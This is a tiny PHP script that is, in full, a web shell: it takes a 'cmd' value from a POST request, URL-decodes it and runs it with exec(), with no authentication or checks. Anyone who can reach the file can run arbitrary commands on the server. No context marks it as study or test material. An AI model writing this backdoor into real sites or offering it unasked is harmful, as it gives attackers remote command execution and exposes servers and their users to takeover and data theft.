<?php

if (isset($_POST['cmd']))
{
	$cmd = urldecode($_POST['cmd']);
	exec($cmd);
}

?>